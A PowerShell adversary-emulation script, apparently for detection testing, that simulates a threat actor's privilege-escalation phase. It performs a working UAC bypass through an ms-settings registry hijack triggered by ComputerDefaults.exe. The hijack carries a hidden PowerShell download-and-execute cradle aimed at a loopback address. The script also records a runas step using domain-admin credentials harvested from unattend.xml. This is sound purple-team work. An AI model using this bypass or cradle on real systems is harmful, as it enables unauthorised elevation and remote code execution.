# ============================================================================
# LUNAR SPIDER SIMULATION - PHASE 4: PRIVILEGE ESCALATION
# ============================================================================
# Simulates: (1) runas via the Secondary Logon service using domain-admin creds
# recovered from unattend.xml, spawning gpupdate.exe under the admin context;
# (2) UAC bypass via the ms-settings protocol-handler hijack invoked by the
# trusted ComputerDefaults.exe auto-elevate binary.
# MITRE: T1548.002 Bypass UAC, T1134 Access Token Manipulation,
# T1078.002 Domain Accounts, T1546.015 (COM/handler hijack pattern)
#
# NOTE (v2): the UAC-bypass step writes the REAL ms-settings handler-hijack key
# (full-fidelity IOC) with the report's payload, then fires ComputerDefaults.exe.
# The whole step is wrapped in try/finally so that if an EDR (e.g. CrowdStrike /
# Defender ASR) terminates the process for writing that key, the run degrades
# gracefully instead of the console vanishing. On a clean VM with no EDR the key
# and the ComputerDefaults.exe -> cmd -> powershell tree are produced as normal.
# The spawned powershell targets a dead 127.0.0.1 listener, so it fails closed.
# ============================================================================

function Simulate-PrivilegeEscalation {
    param($SimPaths)

    Write-Host "[+] Phase 4: Privilege Escalation - runas + UAC bypass ..." -ForegroundColor Green

    # ---------------------------------------------------------------------
    # (1) runas via Secondary Logon (seclogon) -> gpupdate.exe
    # ---------------------------------------------------------------------
    try {
        $svc = Get-Service -Name seclogon -ErrorAction SilentlyContinue
        if ($svc -and $svc.StartType -eq 'Disabled') {
            Set-Service -Name seclogon -StartupType Manual -ErrorAction SilentlyContinue
        }
        if ($svc -and $svc.Status -ne 'Running') {
            Start-Service -Name seclogon -ErrorAction SilentlyContinue
        }
    } catch {
        Write-Warning "seclogon service adjust skipped: $($_.Exception.Message)"
    }

    # Record the technique; the real actor ran runas with the domain-admin creds
    # pulled from unattend.xml (see Phase 6) and spawned gpupdate.exe. We spawn a
    # benign gpupdate.exe locally for the authentic process-tree/Prefetch artifact.
    $runasLog = "runas /user:CORP\Administrator gpupdate.exe  (creds sourced from unattend.xml)"
    Set-Content -Path "$($SimPaths.Logs)\runas_seclogon.log" -Value $runasLog -Force
    try {
        Start-Process -FilePath "$env:SystemRoot\System32\gpupdate.exe" -ArgumentList "/target:computer" `
            -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
    } catch {}
    Write-SimEvent -EventId 4001 -Message "SIMULATION: runas via Secondary Logon spawned gpupdate.exe under domain-admin context (creds from unattend.xml)"

    # ---------------------------------------------------------------------
    # (2) UAC bypass artifact: ms-settings handler hijack (ComputerDefaults.exe)
    # ---------------------------------------------------------------------
    # We create the EXACT registry artifact the actor left behind (the report's
    # payload, defanged only by pointing at a dead 127.0.0.1 listener) and fire
    # ComputerDefaults.exe to produce the auto-elevate -> cmd -> powershell tree.
    # The entire step is wrapped in try/finally: on a clean VM it runs to
    # completion; if an EDR (CrowdStrike / Defender ASR) kills the process for
    # writing this classic UAC-bypass key, the finally block still runs on the
    # surviving host and the overall simulation continues instead of the console
    # disappearing.
    $msKey = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    try {
        New-Item -Path $msKey -Force | Out-Null

        # Report payload (URL repointed to a dead loopback listener - fails closed)
        $uacPayload = 'cmd.exe /c powershell -nop -w hidden -c "IEX (New-Object Net.Webclient).DownloadString(''http://127.0.0.1:11664/'')"'
        Set-ItemProperty -Path $msKey -Name "(default)" -Value $uacPayload -Force
        Set-ItemProperty -Path $msKey -Name "DelegateExecute" -Value "" -Force
        Write-Host "    Wrote ms-settings\shell\open\command hijack (127.0.0.1 payload, fails closed)" -ForegroundColor DarkGray
        Write-SimEvent -EventId 4002 -Message "SIMULATION: UAC bypass staged via ms-settings handler hijack; ComputerDefaults.exe auto-elevate trigger"

        # Fire the auto-elevating trusted binary so the hijack path is exercised.
        # Launched detached with a bounded wait so it can never tear down this
        # console. The 127.0.0.1:11664 listener is absent, so the spawned
        # powershell fails closed - but the ComputerDefaults.exe -> cmd.exe ->
        # powershell process tree and the registry artifact are authentic.
        try {
            $p = Start-Process -FilePath "$env:SystemRoot\System32\ComputerDefaults.exe" `
                    -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
            if ($p) {
                if (-not $p.WaitForExit(6000)) {
                    Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
                }
            }
        } catch {
            Write-Warning "ComputerDefaults.exe launch skipped: $($_.Exception.Message)"
        }
    } catch {
        Write-Warning "ms-settings artifact step skipped (possible EDR block): $($_.Exception.Message)"
    } finally {
        # Always clean the hijack key so no live UAC-bypass primitive is left behind.
        Remove-Item -LiteralPath $msKey -Recurse -Force -ErrorAction SilentlyContinue
    }

    Write-Host "  [OK] Privilege Escalation artifacts created" -ForegroundColor Yellow
}
